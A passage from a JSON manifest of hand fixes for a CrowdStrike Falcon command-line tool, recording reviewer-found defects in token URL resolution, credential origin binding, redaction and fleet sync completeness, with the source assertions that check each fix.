+   "why": "Codex review round 1 of the 4.34.2 reprint (review repo ce4623f), P2 incorrect-authentication-verdict (a one-line fix): with only FALCON_CLIENT_ID and FALCON_CLIENT_SECRET the reachability client minted a token, but the probe step read the unmodified Config's Authorization and printed 'no credential is configured'. One anchored line in doctor.go (tools/apply_edits.py). Seen failing: seen/r1-p2-doctor-pair-verdict-seen-failing.log. Ported to crowdstrike from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "if authHeader == \"\" && !cfg.CredentialConfigured() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_doctor_pair_test.go",
+     "contains": "strings.Contains(cr, \"no credential is configured\")",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "per-cloud-token-url",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "Every token request (automatic mint, refresh grant, auth login, the fleet member_cid mint) resolves its URL through client.ResolveCrowdStrikeTokenURL: a safe CROWDSTRIKE_TOKEN_URL, else /oauth2/token on the configured cloud's host (CROWDSTRIKE_BASE_URL), else US-1 when nothing is configured; an unsafe or untrusted route resolves to no URL and nothing is posted",
+   "why": "Each Falcon cloud (US-1, US-2, EU-1, US-GOV-1) serves its own token endpoint at <cloud>/oauth2/token. Press 4.34.2 hard-codes https://api.crowdstrike.com/oauth2/token at all three generated token sites, so an operator who set only CROWDSTRIKE_BASE_URL to EU-1 or GovCloud posted the client ID and secret to US-1 (0.1.10 did the same; only fleet sync derived the URL, without any safety check). tools/apply_edits.py re-points the three generated sites; fleet_sync.go calls the resolver directly.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/crowdstrike_token_url.go",
+     "contains": "func ResolveCrowdStrikeTokenURL(cfg *config.Config) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_token_url.go",
+     "contains": "func tokenSafeURL(raw string) (*url.URL, bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "tokenURL := ResolveCrowdStrikeTokenURL(c.Config)",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return ErrNoCrowdStrikeTokenURL",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "tokenURL := client.ResolveCrowdStrikeTokenURL(cfg)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "return configErr(client.ErrNoCrowdStrikeTokenURL)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "tokenURL := client.ResolveCrowdStrikeTokenURL(cfg)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "tokenURL = \"https://api.crowdstrike.com/oauth2/token\""
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "not_contains": "tokenURL = \"https://api.crowdstrike.com/oauth2/token\""
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "not_contains": "strings.TrimRight(cfg.BaseURL, \"/\") + \"/oauth2/token\""
+    }
+   ]
+  },
+  {
+   "id": "token-request-body-credentials",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "One client_credentials token form (client.ClientCredentialsTokenForm: grant_type, client_id, client_secret, optional member_cid and scope) for the automatic mint, auth login and the fleet member_cid mint; no HTTP Basic header",
+   "why": "CrowdStrike's /oauth2/token takes client_id and client_secret as form fields (FalconPy's oauth2.token sends them in the body; 0.1.10 did too). Press 4.34.2 renders HTTP Basic client authentication, which the vendor does not document; an unverified auth scheme on the one request every command depends on is a silent-401 risk with every gate green (press-traps s5). Not live-verified either way: no vendor credentials.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/crowdstrike_token_form.go",
+     "contains": "func ClientCredentialsTokenForm(clientID, clientSecret, memberCID string) url.Values {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "form := ClientCredentialsTokenForm(clientID, clientSecret, \"\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "form := client.ClientCredentialsTokenForm(clientID, clientSecret, \"\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "form := client.ClientCredentialsTokenForm(clientID, clientSecret, memberCID)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "req.SetBasicAuth(clientID, clientSecret)"
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "not_contains": "req.SetBasicAuth(clientID, clientSecret)"
+    }
+   ]
+  },
+  {
+   "id": "member-cid-token-pinned",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "fleet sync's child-CID clients present only the member_cid token minted for that CID: the child config is pinned (client.PinToken), so its client never mints, refreshes or swaps in the parent pair's token, and the member_cid mint client is origin-pinned to the token URL; the minted token is held by the credential kit as it arrives.",
+   "why": "fleet sync builds each child client from a copy of the parent config with the client pair cleared. The generated client falls back to FALCON_CLIENT_ID/FALCON_CLIENT_SECRET, and the token binding (minted-token-bound-to-its-client) would then mint, or reuse from process memory, the PARENT token for that config: the child CID's rows would hold the parent tenant's hosts, alerts and vulnerabilities, a wrong result an MSP acts on per tenant. tokenBinding returns 'no mint' first for a pinned config.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/crowdstrike_tokens.go",
+     "contains": "func PinToken(cfg *config.Config) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_tokens.go",
+     "contains": "if tokenPinned(cfg) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "client.PinToken(&scoped)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "scoped.RefreshToken = \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "guardTokenClient(mintClient, cfg, flags.dryRun)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "cliutil.HoldValues(\"minted:token\", tok.AccessToken)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-crowdstrike-root-not-placeholder",
+   "class": "doctor-truth",
+   "status": "active",
+   "summary": "doctorShippedBaseURL is empty: https://api.crowdstrike.com is the real US-1 Falcon API, so doctor dials it and probes the credential instead of reporting 'base_url is still the shipped placeholder' on every healthy default install",
+   "why": "Press-traps s5: the fleet doctor-verdict template set doctorShippedBaseURL to the connector's default base URL, which for CrowdStrike is the real US-1 API. tools/apply_post_replay.py re-applies it after a fresh replay.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "host-records-keyed-by-device-id",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "sync keys host-shaped records by device_id: the spec carries x-resource-id device_id on /devices/combined/devices/v1, /devices/combined/devices-hidden/v1, /devices/combined/host-group-members/v1 and /policy/combined/prevention-members/v1",
+   "why": "The FalconPy-derived spec has no response schemas, so press 4.34.2's ID fallback guesses; the combined host endpoints return host records keyed device_id, and without the key the hidden-devices, host-group-member and prevention-member partitions fell back to descriptive fields (rows collapse). Encoded in the spec (tools/spec_fix.py), so it survives every reprint.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"devices-combined-devices-hidden-v1\":     \"device_id\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"policy\":                                 \"device_id\",",
+     "code_only": true
+    }
+   ],
+   "spec_encoded": true
+  },
+  {
+   "id": "fleet-child-client-guarded",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "fleet sync's member_cid mint and every child-CID client are built like every other client: the mint goes through the guarded plain transport auth login uses (CROWDSTRIKE_CA_CERT / TLS server name, dial guard, plaintext-credential refusal via client.GuardTokenRequest) and the token-client pin (API origin, plus only the token POST on another token host); each child client gets --dry-run, the TLS check and the client hooks (origin pin, response hold, no response cache)",
+   "why": "Tests-helper finding of the 4.34.2 reprint (adapting the ported credential suite), four defects in one class (a hand-built client skipping the shared construction): child clients were built with client.New alone, so the on-disk response cache stayed on and child responses echoing the member_cid token were written to cache/http (seen/fleet-child-client-unguarded-cache-seen-failing.log, fleet-child-client-guarded-blackbox); `fleet sync` against an http:// base URL off loopback posted client_secret in the clear (fleet-mint-plaintext-refused); the mint used the default transport so CROWDSTRIKE_CA_CERT was ignored (fleet-mint-honors-ca-cert); guardTokenClient pinned only the exact token path, so the shipped same-origin redirect test failed (member-cid-same-origin-redirect).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "if err := ApplyClientHooks(c); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "plain, err := client.NewPlainHTTPClient(flags.timeout, cfg)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "flags.applyTLSFlags(cfg)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "req, err = client.GuardTokenRequest(httpClient, req, []byte(form.Encode()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_guard.go",
+     "contains": "installPins(hc, newCrowdStrikePins(api, tokenURL), dryRun)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_member_cid_pinned_test.go",
+     "contains": "func TestFleetSyncWritesNoCredential(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-store-keeps-no-credential",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "fleet sync stores each entity's raw record in fleet_entities only after cliutil.RedactSecretFields (credential-named members and containers dropped at any depth)",
+   "why": "Tests-helper finding of the 4.34.2 reprint (adapting the ported credential suite), fleet_entities stored a host record's credential-named containers verbatim (a \"secrets\" list); the generic store's withholding (store-never-keeps-secrets) does not cover the novel's own table. Seen failing: seen/fleet-store-credential-named-value-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "fleetStoredRaw(e.Raw)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "out, err := json.Marshal(cliutil.RedactSecretFields(v))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_codex_r1_test.go",
+     "contains": "func TestR1FleetStoreKeepsNoCredentialNamedValue(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-sync-walks-every-page",
+   "class": "pagination",
+   "status": "active",
+   "summary": "fleet sync walks every page of a list by CrowdStrike's own paging metadata (meta.pagination.total, and the after cursor where the endpoint returns one), dedupes records, and warns when it read fewer records than the API reports instead of reporting the tenant complete",
+   "why": "Tests-helper finding of the 4.34.2 reprint (adapting the ported credential suite), class incomplete-paging-read-as-complete: the shipped walker stopped at the first short page, so a server capping the page size kept 100 of 263 hosts and an endpoint ignoring offset kept 500 of 700, both reported complete per CID (FalconPy documents meta.pagination {offset, limit, total} and the after cursor on the combined and alerts endpoints). Seen failing: seen/fleet-sync-short-walk-complete-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "func fleetPagingOf(data json.RawMessage) fleetPaging {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "func (e *fleetShortWalk) Error() string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_codex_r1_test.go",
+     "contains": "func TestR1FleetSyncNeverReadsAShortWalkAsComplete(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "url-setting-not-a-credential",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "A *_url configuration key (token_url, base_url) is a URL setting: the credentials the URL carries are held (credkit.HoldURL, handfixes.json credkit-url-credentials-held), the URL itself is not, so a config.toml naming its Falcon cloud's token endpoint still saves and prints.",
+   "why": "Tests-helper finding of the 4.34.2 reprint: token_url reads as a credential name (\"token\"), so a holder that held every credential-named config value held the whole URL https://api.eu-1.crowdstrike.com/oauth2/token: every output naming it was withheld and every config.toml save that kept it was refused, so auth login and auth set-token failed for any non-US-1 configuration file. Under the kit, config:token_url and config:base_url are declared Identifiers and neither is a CredentialFields name.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"config:token_url\", Reason:",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"config:base_url\", Reason:",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/crowdstrike_persist_test.go",
+     "contains": "func TestConfigNamingItsCloudTokenURLStillSaves(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "store-partition-follows-path",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "Local reads and the automatic write-through use the store partition sync fills for the endpoint the request path is (the most specific pp:path template), never the command group's label; a path no partition is synced from is never read locally, cached or used as a network fallback; a mutation response is never cached",
+   "why": "Tests-helper finding of the 4.34.2 reprint (adapting the ported credential suite), class sync-read-partition-mismatch (ported from the appdirect 4.34.2 review): every devices command reads the `devices` partition (/devices/combined/devices/v1), so with only that partition synced `devices query-hidden --data-source local` and `devices query-host-groups --data-source local` printed ordinary visible hosts. Hand file internal/cli/crowdstrike_partitions.go; five anchored lines in data_source.go (tools/apply_edits.py). Seen failing: seen/generated-partition-mismatch-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/crowdstrike_partitions.go",
+     "contains": "func crowdstrikeStorePartition(label, path string, isList bool) (string, bool) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "resourceType, isList = crowdstrikeStorePartition(resourceType, path, isList)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "resourceType, _ = crowdstrikeStorePartition(resourceType, path, true)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "return nil, DataProvenance{}, crowdstrikeUnsyncedLocalError(path)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if resourceType == crowdstrikeUnsyncedPartition {",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if !crowdstrikeMutationWriteThrough(resourceType) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "stored-credential-bound-to-its-origin",
+   "class": "credential-origin",
+   "status": "active",
+   "summary": "A stored credential (token, auth header, refresh token, client pair) is applied only for the Falcon cloud it was recorded for: the credential store's recorded base_url (or, with none recorded, the configured base URL) and a trusted config file's own base_url must match the server this run sends to, else the credentials are refused and reported, never sent. No configured [headers] entry may carry a credential (held, dropped, reported): only the token binding sets Authorization, and fleet sync's child configs carry no credential header.",
+   "why": "Codex review r1 of the crowdstrike 4.34.2 reprint (session 01a18775-1d96-7c22-8360-390e973f3e92), classes credential-sent-to-another-host and token-sent-for-another-tenant. `auth set-token` against US-1 then CROWDSTRIKE_BASE_URL=EU-1 sent the US-1 token to EU-1 (no pair, so the token binding never ran); a config.toml naming EU-1 over a credential store recorded for US-1 sent the stored US-1 token to EU-1 (Load dropped the store's recorded base_url, so the binding compared the configuration with itself); a trusted config's [headers] Authorization was set after the client's bearer and overrode each child CID's member_cid token, so fleet sync stored the parent tenant's hosts under the child CID. Hand file internal/config/crowdstrike_origin.go; two anchored lines in generated config.go (tools/apply_credential_rules.py); one line in fleet_sync.go scopedChildConfig. Seen failing: seen/r1-stored-credential-origin-seen-failing.log, seen/r1-token-for-another-tenant-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "c.bindFileCredentials()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if ok && creds != nil && creds.HasValues() && c.storedCredentialsBound(creds) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/crowdstrike_origin.go",
+     "contains": "func (c *Config) storedCredentialsBound(creds *cliutil.Credentials) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/crowdstrike_origin.go",
+     "contains": "func (c *Config) bindFileCredentials() {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/crowdstrike_origin.go",
+     "contains": "func WithoutCredentialHeaders(h map[string]string) map[string]string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "scoped.Headers = config.WithoutCredentialHeaders(cfg.Headers)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_csreview_r1_test.go",
+     "contains": "func TestR1StoreRecordedForAnotherCloudIsNotApplied(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/crowdstrike_csreview_r1_test.go",
+     "contains": "func TestR1SetTokenStaysWithItsCloud(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_csreview_r1_test.go",
+     "contains": "func TestR1ConfiguredAuthorizationNeverReachesAChildRead(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-refresh-completeness",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "What fleet sync keeps is what it read: a kind read completely for a CID (whole walk: no short walk, no Falcon errors on any page, not ended by the page cap) replaces that CID's rows of that kind in one transaction, an empty complete read leaving none; a failed or incomplete read replaces nothing and warns; the Flight Control fabric kinds likewise. A posture snapshot (fleet trend) is recorded only for a CID whose hosts, alerts and vulnerabilities were all read completely in the same sync. (Codex r2 narrowed it: only a scope the read proves, see fleet-replace-only-a-proven-scope; the Flight Control fabric is upserted, and the authenticated CID is replaced only bound to its client.)",
+   "why": "Codex review r1 of the crowdstrike 4.34.2 reprint (session 01a18775-1d96-7c22-8360-390e973f3e92), classes stale-records-survive-complete-refresh and partial-refresh-recorded-as-complete-posture: rows were only ever upserted, so a remediated vulnerability that left Spotlight's status:'open' list stayed open in fleet vulns and the scorecard forever; and every sync recorded a snapshot from whatever kinds it fetched, so a policies-only sync recorded zero critical vulnerabilities and fleet trend called the tenant better. A populated Falcon errors list on a 200 page is a failure signal too (any failure signal wins). Seen failing: seen/r1-fleet-refresh-completeness-seen-failing.log. Load-bearing proofs: seen/r1-fleet-walk-cap-seen-failing.log, seen/r1-fleet-page-errors-seen-failing.log, seen/r1-fabric-replace-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "DELETE FROM fleet_entities WHERE cid = ? AND kind = ?",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "func postureSnapshots(ents []fleetEntity, complete map[fleetScope]bool, synced []string) (snaps []fleetSnapshot, skipped []string) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "snaps, skipped := postureSnapshots(allEnts, complete, synced)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "if err := persistFleetEntities(ctx, dbPath, ents, read, owner, \"cid \"+label, &summary); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "if msg := falconErrorsOf(data); msg != \"\" && apiErrors == \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "read = append(read, fleetScope{CID: cid, Kind: entKind})",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_csreview_r1_test.go",
+     "contains": "func TestR1CompleteRefreshReplacesTheKindItRead(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_csreview_r1_test.go",
+     "contains": "func TestR1PartialRefreshRecordsNoPosture(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_csreview_r1_test.go",
+     "contains": "func TestR1PageWithFalconErrorsReplacesNothing(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "return all, &fleetShortWalk{got: len(all), total: total, capped: true}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_csreview_r1_test.go",
+     "contains": "func TestR1WalkEndedByThePageCapIsIncomplete(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_csreview_r1_test.go",
+     "contains": "func TestR1FabricRefreshUpsertsTheChildList(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-remediate-host-per-tenant",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "fleet remediate counts a host once per tenant: its host key carries the CID, so two tenants' DC01 are two hosts",
+   "why": "Codex review r1 of the crowdstrike 4.34.2 reprint (session 01a18775-1d96-7c22-8360-390e973f3e92), P2 host-identity-collapsed-across-tenants (one-line fix): hosts were keyed by hostname/local IP alone, so the same name in two CIDs counted as one host and understated a remediation's reach. The within-tenant aid preference is a follow-up (.review/followups.md).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_remediate.go",
+     "contains": "g.hosts[e.CID+\"\\x00\"+host] = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-replace-only-a-proven-scope",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "A fleet sync read replaces stored rows only for the scope it proves complete: one child CID, or the authenticated CID (\"self\") bound to the API client that read it (an owner column holding a one-way digest of the client ID and token URL, never the client ID: a complete read deletes only that client's rows of the kind, never another client's in a shared --db; a row written before the column: see fleet-legacy-rows-not-current); the Flight Control fabric (\"self\", no owner) is upserted, never replaced; the default vulnerability filter (an operator's --vuln-filter read is upserted); and pages that carry CrowdStrike's resources envelope (a 200 null, {} or non-JSON answer makes the walk incomplete)",
+   "why": "Codex review round 2 of the 4.34.2 reprint (fix diff f59806f..3abbea6), fixed after the stop rule fired (main pane, no round 3): two P1s in the class round 1's fleet-refresh-completeness introduced, plus its P2: `fleet sync --vuln-filter \"status:'open'+aid:'a...'\"` deleted every other stored open vulnerability for the CID (FalconPy _spotlight_vulnerabilities.py documents the aid/status filters); parent B's `fleet sync --kinds fabric` on a shared --db deleted parent A's child roster (rows share CID \"self\"); a 200 {} answer authorized deleting the CID's rows. Seen failing: seen/r2-filtered-vuln-replaces-nothing-seen-failing.log, r2-self-scope-never-replaced, r2-envelope-required. Codex r1 of the 0.1.11 branch (session 01a1a833-7a33-7c62-b373-fa46002f296b), class completed refresh never removes disappeared records: making every \"self\" scope upsert-only kept a remediated vulnerability after a complete, unfiltered empty Spotlight read of the authenticated CID, and fleet scorecard still counted it. Seen failing: .review/seen/r1-self-refresh-removes-remediated.log (built binary), r1-self-refresh-removes-remediated-unit.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "if entKind == kindVuln && vulnFilter != \"\" && vulnFilter != defaultVulnFilter {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "if s.CID == \"self\" && owner == \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "func fleetEnvelopeProblem(data json.RawMessage) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "if msg := fleetEnvelopeProblem(data); msg != \"\" && apiErrors == \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_codex_r2_test.go",
+     "contains": "func TestR2FilteredVulnReadReplacesNothing(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_codex_r2_test.go",
+     "contains": "func TestR2SecondParentFabricKeepsFirstParentsChildren(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_codex_r2_test.go",
+     "contains": "func TestR2PageWithoutAnEnvelopeReplacesNothing(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "owner = selfScopeOwner(clientID, tokenURL)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "func selfScopeOwner(clientID, tokenURL string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "del, args = del+` AND owner IN (?, '')`, append(args, owner)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "func ensureFleetOwnerColumn(ctx context.Context, db *sql.DB) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_r1fix_test.go",
+     "contains": "func TestR1FixSelfRefreshInAStoreBeforeTheOwnerColumn(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/crowdstrike_r1fix_test.go",
+     "contains": "func TestR1FixSelfRefreshRemovesRemediated(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "fleet-legacy-rows-not-current",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "A \"self\" host, alert, vuln or policy row written before the owner column is not current posture: no fleet rollup reads it (loadFleetEntitiesFrom), every rollup and fleet sync print one line naming how many are excluded and that the next complete fleet sync of that kind replaces them, and a complete unfiltered read of a kind deletes that kind's pre-owner rows. The fabric (also cid \"self\", no owner), child tenants' rows and other clients' rows are untouched.",
+   "why": "Codex review round 2 of the 0.1.11 branch (session 01a1a833-7a33-7c62-b373-fa46002f296b), class historical rows remain counted as current after a complete refresh: a remediated critical vulnerability written by a pre-owner binary stayed in fleet scorecard after a complete empty Spotlight read, since the replacement deleted only rows of the new owner digest. Seen failing: .review/seen/r3-legacy-rows-not-current.log; the input on the built binaries: .review/r2repro/repro.log, repro-after-fix.log. Codex round 3, class incomplete results lose their qualification across the CLI-to-MCP handoff: a note: line never reached an MCP client, since the server forwards only hint: and warning: lines; seen failing: .review/seen/r3-mcp-line-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "const fleetLegacySelfRow = `cid = 'self' AND owner = '' AND kind IN ('host', 'alert', 'vuln', 'policy')`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "` FROM fleet_entities WHERE NOT (` + fleetLegacySelfRow + `)`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "` AND owner IN (?, '')`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "if note := fleetLegacyRowsNote(context.Background(), db.DB()); note != \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "if note := fleetLegacyRowsNote(ctx, st.DB()); note != \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/crowdstrike_r1fix_test.go",
+     "contains": "func TestR3LegacySelfRowsAreNotCurrentPosture("
+    },
+    {
+     "file": "cli/internal/cli/fleet_store.go",
+     "contains": "\"warning: %s.\\n\", note)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/crowdstrike_r1fix_test.go",
+     "contains": "func TestR3LegacyRowLineReachesMCP("
+    }
+   ]
+  },
+  {
+   "id": "fleet-selectors-deduplicated",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "fleet sync reads each selected kind and CID once: --kinds is normalized (an alias such as spotlight for vulns, another case) and kept once under the first name given; --cids, --member-cid and the --all-cids list are trimmed, lower-cased (the form Falcon lists a CID in) and kept once; before any fetch, store write or posture snapshot",
+   "why": "Codex r1 of the 0.1.11 branch (session 01a1a833-7a33-7c62-b373-fa46002f296b), class duplicate selections count the same entity repeatedly: `--kinds hosts,alerts,vulns,vulns` (or vulns,spotlight, or HOSTS,Vulns,vulns) fetched the vulnerabilities twice, so the sync counted every entity twice and the posture snapshot recorded one open critical vulnerability as two (fleet trend: critical_vulns 2, delta 1, worse); `--cids X,X` minted and read X twice the same way, and `--cids x,X` stored one tenant as two. Seen failing: .review/seen/r1-repeated-selectors-count-once.log (built binary).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "if ek := fleetEntityKind(key); ek != \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "func uniqueCIDs(cids []string) []string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "cids = uniqueCIDs([]string{opts.memberCID})",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "cids = uniqueCIDs(splitCSV(opts.cidsCSV))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/fleet_sync.go",
+     "contains": "cids = uniqueCIDs(cids)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/crowdstrikeblackbox/crowdstrike_r1fix_test.go",
+     "contains": "func TestR1FixRepeatedSelectorsCountOnce(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "no-create-alias-on-destructive-commands",
+   "class": "create-alias-on-destructive",
+   "status": "active",
